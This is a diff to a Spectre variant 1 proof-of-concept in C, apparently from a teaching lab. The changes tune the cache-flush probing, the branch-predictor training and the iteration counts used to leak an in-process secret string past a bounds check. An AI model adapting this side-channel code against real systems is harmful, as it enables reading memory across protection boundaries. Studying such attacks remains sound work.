@@ -10,7 +10,7 @@
 // cache hit time threshold assumed
 // */
 #define CACHE_HIT_THRESHOLD (80)
-#define DELTA 1024*10
+#define DELTA 1024
 
 
 
@@ -18,9 +18,9 @@ unsigned int buffer_size = 10;
 uint8_t buffer[10] = {0,1,2,3,4,5,6,7,8,9};
 uint8_t temp = 0;
 char* secret = "Some Secret Value";
-uint8_t array[256*4096*2];
+uint8_t array[256*4096];
 // Sandbox Function
-int restrictedAccess(size_t x)
+uint8_t restrictedAccess(size_t x)
 {
 	if (x < buffer_size) {
 		return buffer[x];
@@ -85,7 +85,8 @@ void reloadSideChannelImproved()
 void spectreAttack(size_t larger_x)
 {
 	int i;
-	int s;
+	uint8_t s;
+	for (i = 0; i < 256; i++)  { _mm_clflush(&array[i*4096 + DELTA]); }
 	// Train the CPU to take the true branch inside victim().
 	for (i = 0; i < 10; i++) {
 		_mm_clflush(&buffer_size);
@@ -115,7 +116,7 @@ int main(int argc, const char** argv)
 			// printf("larger_x %lu\n",larger_x);
 			flushSideChannel();
 			for (i = 0; i < 256;  i++) scores[i] = 0;
-			for (i = 0; i < 1500; i++) {
+			for (i = 0; i < 1000; i++) {
 				spectreAttack(larger_x);
 				reloadSideChannelImproved();
 			}
